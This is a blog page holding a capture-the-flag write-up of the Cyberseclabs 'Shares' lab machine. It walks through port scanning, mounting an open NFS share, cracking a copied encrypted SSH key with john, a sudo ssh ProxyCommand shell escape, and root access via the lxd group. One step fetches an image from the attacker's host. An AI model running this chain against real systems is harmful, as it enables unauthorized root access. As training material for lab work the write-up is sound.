<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Cyberseclabs - Shares | twseptian’s website</title>
<meta name="description" content="Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let’s follow this link https://www.cyberseclabs.co.uk/.">


  <meta name="author" content="twseptian">
  
  <meta property="article:author" content="twseptian">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="twseptian's website">
<meta property="og:title" content="Cyberseclabs - Shares">
<meta property="og:url" content="http://localhost:4000/cyberseclabs/cyberseclabs-shares/">


  <meta property="og:description" content="Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let’s follow this link https://www.cyberseclabs.co.uk/.">



  <meta property="og:image" content="http://localhost:4000/assets/images/avatar_backup.png">



  <meta name="twitter:site" content="@twseptian_">
  <meta name="twitter:title" content="Cyberseclabs - Shares">
  <meta name="twitter:description" content="Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let’s follow this link https://www.cyberseclabs.co.uk/.">
  <meta name="twitter:url" content="http://localhost:4000/cyberseclabs/cyberseclabs-shares/">

  
    <meta name="twitter:card" content="summary">
    
      <meta name="twitter:image" content="http://localhost:4000/assets/images/avatar_backup.png">
    
  

  



  <meta property="article:published_time" content="2020-12-28T00:00:00+07:00">



  <meta property="article:modified_time" content="2020-12-28T12:58:26+07:00">



  

  


<link rel="canonical" href="http://localhost:4000/cyberseclabs/cyberseclabs-shares/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "my notes, journey and stuff",
      "url": "http://localhost:4000/",
      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
    
  }
</script>


  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />


  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">




<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="twseptian's website Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->




    <!-- start custom head snippets -->
<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
<!-- insert favicons. use https://realfavicongenerator.net/ -->
<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="theme-color" content="#ffffff">
<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
        
        <a class="site-title" href="/">
          twseptian's website
          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/">posts</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/">tags</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/">categories</a>
            </li><li class="masthead__menu-item">
              <a href="/projects/">projects</a>
            </li><li class="masthead__menu-item">
              <a href="/research/">research</a>
            </li><li class="masthead__menu-item">
              <a href="/about/">about me</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    
    <aside class="sidebar__top">
      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
      </aside>

    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/avatar_backup.png" alt="twseptian" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">twseptian</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Perpetual Learner</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia (ID)</span>
        </li>
      

      
        
          
            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>




  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Cyberseclabs - Shares">
    <meta itemprop="description" content="Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let’s follow this link https://www.cyberseclabs.co.uk/.">
    <meta itemprop="datePublished" content="2020-12-28T00:00:00+07:00">
    <meta itemprop="dateModified" content="2020-12-28T12:58:26+07:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Cyberseclabs - Shares
</h1>
          
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2020-12-28T00:00:00+07:00">December 28, 2020</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
        
  </p>
  



          <section class="page__share">
  
    <!--<h4 class="page__share-title">Share on</h4>-->
  

  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=Cyberseclabs+-+Shares%20http%3A%2F%2Flocalhost%3A4000%2Fcyberseclabs%2Fcyberseclabs-shares%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fcyberseclabs%2Fcyberseclabs-shares%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fcyberseclabs%2Fcyberseclabs-shares%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
  
  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
</section>

          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu">
  <li><a href="#network-scanning">Network Scanning</a></li>
  <li><a href="#enumeration">Enumeration</a></li>
  <li><a href="#privilege-escalation">Privilege Escalation</a>
    <ul>
      <li><a href="#privilege-escalation-via-lxd">privilege escalation via lxd</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <p>Cyberseclabs is a CTF platform like HTB or THM, some of the machine includes are Linux, windows, active directory, and some challenge. If you wanna try cyberseclab, let’s follow this link https://www.cyberseclabs.co.uk/.</p>

<p>The first box for a new user is Shares Linux machine. Its machine has some open service like NFS file sharing, we can enumerate to the machine via NFS sharing and escalate root access using ssh.</p>

<p><img src="/assets/images/cyberseclabs-shares/b15544a646064ae1b619f780ad933589.png" alt="8b2b186ea5f6f934b72a1b58ddd2d04c.png" /></p>

<h1 id="network-scanning">Network Scanning</h1>

<p>rustscan</p>

<p><code class="language-plaintext highlighter-rouge">rustscan 172.31.1.7 --ulimit 5000 -- -sC -sV -A -oN nmap_result</code></p>

<p>output</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Mon Dec 28 12:02:48 2020 as: nmap -sC -sV -A -oN nmap_result -vvv -p 21,80,111,2049,27853,35541,35193,44721,58677 172.31.1.7
Nmap scan report for 172.31.1.7
Host is up, received syn-ack (0.32s latency).
Scanned at 2020-12-28 12:02:49 WIB for 24s

PORT      STATE SERVICE  REASON  VERSION
21/tcp    open  ftp      syn-ack vsftpd 3.0.3
80/tcp    open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Pet Shop
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44721/tcp   mountd
|   100005  1,2,3      45915/tcp6  mountd
|   100005  1,2,3      49409/udp6  mountd
|   100005  1,2,3      54630/udp   mountd
|   100021  1,3,4      35541/tcp   nlockmgr
|   100021  1,3,4      39565/tcp6  nlockmgr
|   100021  1,3,4      48234/udp   nlockmgr
|   100021  1,3,4      60580/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
27853/tcp open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 97:93:e4:7f:41:79:9c:bd:3d:d8:90:c3:93:d5:53:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyk8rqOZBxSEXCu+mZCgIQOiHcAg/2ivCFVqGH0ehzvIN3eFZ5jll3zDyKehhaSyYeouoQZbpUk4fmTEqPFdUGjOzXhUhf6pQ0atKx3hms+b5ZLaCL2UjburequfIHCfDCbt6Wbj7dozIMmQ4+qjPQqBkUci7DjCTA/LbxNPL47hoC+3vAvCgRxAK6Yq4tUlil3eSgHX9EeJSxJQpDShPjTZ384+DUMx3VJbXFNBtxsUblPeykzrM18Hill3Yy/D4L9ZW0PJ5P3W+cFQuHc3RWLXCY6S1WmHDxGcI2UA3f2UaBDn2zm3cmgt3yKWTuqY98NlSh880AzmAcS6HpDlY/
|   256 11:66:e9:84:32:85:7b:c7:88:f3:19:97:74:1e:6c:29 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDF3clGPfC6R84UaHxAMoGIYn58Njt+Dth8rsl/Aa8W9SXquC3L+TGPb5dVRArkmCgta+moG16PhstNUHlyNVbA=
|   256 cc:66:1e:1a:91:31:56:56:7c:e5:d3:46:5d:68:2a:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKX5ZbEhRnQU7woPnhhFMtk+c0HJcj0T3xPfAWHTBH9
35193/tcp open  mountd   syn-ack 1-3 (RPC #100005)
35541/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
44721/tcp open  mountd   syn-ack 1-3 (RPC #100005)
58677/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 28 12:03:13 2020 -- 1 IP address (1 host up) scanned in 25.38 seconds
</code></pre></div></div>

<p>open ports<br />
port 21: ftp<br />
port 80: http<br />
port 111: rpcbind<br />
port 2049: nfs<br />
port 27853: ssh<br />
port 35193: mountd<br />
port 35541: nlockmgr<br />
port 44721: mountd<br />
port 58677: mountd</p>

<h1 id="enumeration">Enumeration</h1>

<p>port 80: http<br />
<img src="/assets/images/cyberseclabs-shares/461bf4b559714cd08ba23b369f0e7895.png" alt="220773834aa9c519b6cc6ac0ea01e35b.png" /></p>

<p>port 2049: nfs sharing</p>

<p>type: <code class="language-plaintext highlighter-rouge">showmount -e 172.31.1.7</code><br />
option: <code class="language-plaintext highlighter-rouge">-e</code> : exports</p>

<p><img src="/assets/images/cyberseclabs-shares/0ee2f0735a944417b30d1a4aae2fb8af.png" alt="68429e82fcda5de49dc3678f01b7db9c.png" /></p>

<p>remote nfs to our machine</p>

<p><code class="language-plaintext highlighter-rouge">sudo mkdir /mnt/Shares/ &amp;&amp; sudo mount -t nfs 172.31.1.7:/home/amir/ /mnt/Shares &amp;&amp; cd /mnt/Shares/</code></p>

<p><img src="/assets/images/cyberseclabs-shares/606b7001cf714c85bb8711d27d3050fa.png" alt="8f423c69f53435ead367aaec54d60a50.png" /></p>

<p>go <code class="language-plaintext highlighter-rouge">.ssh</code> and copy file <code class="language-plaintext highlighter-rouge">id_rsa.bak</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8D55B7449F8965162DA3B7F2F017FC21

2lI1tgSF61MjFg2Er22GWr9hImJbuZ01I556yFoLAGNj/95ZB2H8Er9u8wfMgr8z
uB8Yuw2GmO0jJguQ4CK36kDLT/hpG5AW5WfHASzePHx58Ol2hrH+2e5IAoIwcVmi
bFN3zIYYCznn6bIvRaqwkuxaD01EG8IPxgAvm0Nr3sP539wngplyf7/+xqvPyT18
jT058FEMPFmeb+V0MHczlNWOW6wrGnxQAea2ON+IUwiSsTVSLv4QLGVWF8Lcualy
t4+4Kr47gdlxRh9HcNDztfIztimMdGp8AdV5z4KDKyL6FUVfmZqC2nxhbFUKtF7k
su7qHGpV9p9Pkglx+/rUq9NeifFcRGrhsOWctUXmWJ7BbmrqFgw1+X8ui6A/uttE
R8hEblI4obffLnGDrAO4wuH+qtA2oelwwjl/JxyqwbGH4RGAW/4AseqDzQ6RpfgQ
Sq8wBPb5MMp2ZKEzEl8qcWcwS1FCGz/VPHpnEYwfpFlcJ1kpqkiT5gmNrDFauN1m
upeSS7T5iAeHHmskbHJfNNSGYjSbTRzCSFlq2vCNXGte7jta34YCVucNHBIUR/2y
GLrm3CmVYPrjdw0irwDt+uepPfUyQQLhSqiZdbyGiljlUeij5+zJax7tOjlBBjBS
Y0rMRwiG8FGDEBbSmDZk30qB3Qb9TQcaqe9Wi/liFuxVyfbukiGW2b65JGbd7R1q
Vh6pKw4Hd35iGmVskme7evsSupEMOu9fKsJAkIrQTxadpU8wG2wkp0NTM7fh3aut
TDGKorRXOXj+cV6zehjXUYyUTesTMDh9EUVmHuixvIFX8V3w562BV28murByt7I+
ubvmZxjvh51nzpOJa4g61tnj/4OCbhFCEK4nsExh0HS11WeDAvueDauLk2Wgiw/z
/yyssrshPiXe/vxYGFJlHelyDaUSwpdrZ0AGzwUutN0rOrh3yS6yTDH2raLSa76y
e1bxe+rh2Q/iEhzqa1RbWrg7fA+5FJRLAZdYlaqlEsVt81nw4mdBCpjEbUl19egF
xIqogCAilFWvnZQ4f12JPmk0mke84idw76+SdBeof18gGiR3mWn3IyoFLRacMs5N
4zrNBXOGCVVzXCoo88ioYw1I91O57c0vbx8S40SbIevUprphf3VTZlyrRxw2AB/R
zclXHN/fEewst2maxauD+32Krm1uvTcCNk3CNre7NwPb6tB0rY3R3E7h2S/MKt0Y
eZKbFFmLwnokHqzSI8uIy8wrPj6H9R+wxT0+/KPyi3L7JIbParsHO4flBx1sMCUl
jlSNW/3J2ADP7QKA5AyjVcsIbp/aXyeJKCtglRc4Yl8mEmCroe61pCDO0mnatWxF
Y9/z6VRC61sjO4T1xYcGFSlVeXANuN8TYR8mUyvruG8OoNQ65RvgxSCRPzFe4EAm
xmXIQ4pDW59LSO7PnPdjsGN8eY7xTnG5509DYK6FoUC0T8hjp/wR9ucKDDqQoXpW
BM9cM5IPltG+wAlP39EbGMinnqgqDazWAk/wSKo4ieGLnWcNORe7Ti299tImCy0l
8zJWICDbH7bSMYyVPlWBrgUBWQ6xFI55iKdhjhlQdblZI04DoSathKFe+Khjb8bi
-----END RSA PRIVATE KEY-----
</code></pre></div></div>

<p>convert using <code class="language-plaintext highlighter-rouge">ssh2john</code></p>

<p><img src="/assets/images/cyberseclabs-shares/4a48f2d53c17467fb954e5a16de4ce8e.png" alt="7944a698bc0f691aadc6dac17efea904.png" /></p>

<p>and bruteforce using <code class="language-plaintext highlighter-rouge">john</code></p>

<p><img src="/assets/images/cyberseclabs-shares/1b09cf0a873a45bb89ef5a367750782d.png" alt="3cac0b2aafa7037497058691089497b6.png" /></p>

<p>amir:hello6</p>

<p>ssh login</p>

<p><img src="/assets/images/cyberseclabs-shares/3a15c81e90594042b2f1582de56167f2.png" alt="bac34cdd7f97b66bed28b45d0c90b840.png" /></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<p>check privilege escalation via sudo -&gt; <code class="language-plaintext highlighter-rouge">sudo -l</code></p>

<p><img src="/assets/images/cyberseclabs-shares/91ab066d13c04ccda0f8d9e2b196f64c.png" alt="ee7aa1191b2d70ce69974c6a4d1c6dca.png" /></p>

<p>we use <code class="language-plaintext highlighter-rouge">/usr/bin/python3</code> as <code class="language-plaintext highlighter-rouge">amy</code></p>

<p><img src="/assets/images/cyberseclabs-shares/3e14d86d985348e1be712bdec2f41349.png" alt="397afacbbc1e62afd310cf322e84bf4f.png" /></p>

<p><code class="language-plaintext highlighter-rouge">access.txt</code> on <code class="language-plaintext highlighter-rouge">amy</code>’s directory</p>

<p><img src="/assets/images/cyberseclabs-shares/87f29349ecd04c4b892d650cf639df8b.png" alt="5f31b577f1786bcfb5db3841af43e7a8.png" /></p>

<p>when we as <code class="language-plaintext highlighter-rouge">amy</code> find privilege escalation using <code class="language-plaintext highlighter-rouge">sudo -l</code></p>

<p><img src="/assets/images/cyberseclabs-shares/572d44cd2ca849708ae32006bcb9e6ca.png" alt="a1ef19e9317f7fd88a1368aaec02146b.png" /></p>

<p>ssh reference from <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo">https://gtfobins.github.io/gtfobins/ssh/#sudo</a></p>

<p><img src="/assets/images/cyberseclabs-shares/d068433c6bf740a68a3bf422980e3ff3.png" alt="4d934a503be1dcebdfc55ed4717e4f0f.png" /></p>

<p><code class="language-plaintext highlighter-rouge">sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x</code></p>

<p><img src="/assets/images/cyberseclabs-shares/06482424eab74157be96c572030b94fe.png" alt="4e0d82861abe3cf071116bdda369e6ff.png" /></p>

<h2 id="privilege-escalation-via-lxd">privilege escalation via lxd</h2>

<p>back into amir, and look <code class="language-plaintext highlighter-rouge">id</code> from amir’s, we found <code class="language-plaintext highlighter-rouge">lxd</code></p>

<p><img src="/assets/images/cyberseclabs-shares/9fc729109559422ab8d66efdf79fd4d8.png" alt="b9e139e2459bf30c05b323214eb46e96.png" /></p>

<p>we can read and learn about ‘lxd’ privilege escalation</p>
<ul>
  <li>https://www.hackingarticles.in/lxd-privilege-escalation/</li>
  <li>https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine 
</code></pre></div></div>
<p><img src="/assets/images/cyberseclabs-shares/3faa926568694d34acaf17588780a608.png" alt="044fc45424cb694fbbff12c9fee4359d.png" /></p>

<p>alpine-v3.12-x86_64-20201228_1430.tar.gz</p>

<p><img src="/assets/images/cyberseclabs-shares/36af87ba526c4fd2befeb3fa71eca0e0.png" alt="c5f81bd1846ba642cba22352686276e1.png" /></p>

<p>upload to target machine</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://10.10.1.248:8001/alpine-v3.12-x86_64-20201228_1430.tar.gz
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image import /tmp/alpine-v3.12-x86_64-20201228_1430.tar.gz --alias myimage
lxc storage create pool dir
lxc profile device add default root disk path=/ pool=pool
</code></pre></div></div>
<p>check storage list</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc image list
</code></pre></div></div>
<p><img src="/assets/images/cyberseclabs-shares/14c5fb79ef9342fdbed2656a9223c198.png" alt="f662812ab4aa49ad6fcda52a81f4a3e2.png" /></p>

<p>check pool list</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc storage list
</code></pre></div></div>
<p><img src="/assets/images/cyberseclabs-shares/716922f5ad5a4eb39df4f688d8584111.png" alt="051a54f5cd145fb1b5a3ad9331d5e7da.png" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
</code></pre></div></div>
<p>root directory</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /mnt/root/root
</code></pre></div></div>

<p><img src="/assets/images/cyberseclabs-shares/4fc16457adba45e4b7a4d3c0d7166e69.png" alt="8bd7f93329b4b1cb2196787e30b38bd9.png" /></p>

<p>amy’s directory</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /mnt/root/home/amy
</code></pre></div></div>
<p><img src="/assets/images/cyberseclabs-shares/9fa4c349f819445c9d4e45067874dba0.png" alt="c190baed333418b7452be9b43a50d139.png" /></p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#cyberseclabs" class="page__taxonomy-item" rel="tag">cyberseclabs</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lxc" class="page__taxonomy-item" rel="tag">lxc</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#lxd" class="page__taxonomy-item" rel="tag">lxd</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#nfs" class="page__taxonomy-item" rel="tag">nfs</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
  
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#cyberseclabs" class="page__taxonomy-item" rel="tag">Cyberseclabs</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-12-28">December 28, 2020</time></p>


      </footer>
      
      
  <nav class="pagination">
    
      <a href="/tryhackme/thm-startup/" class="pagination--pager" title="TryHackMe - Startup
">Previous</a>
    
    
      <a href="/proving%20ground/vulnhub/Solstice/" class="pagination--pager" title="Vulnhub &amp; Proving Ground - Solstice
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
- Date: 07/01/2022
- Exploit Au...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

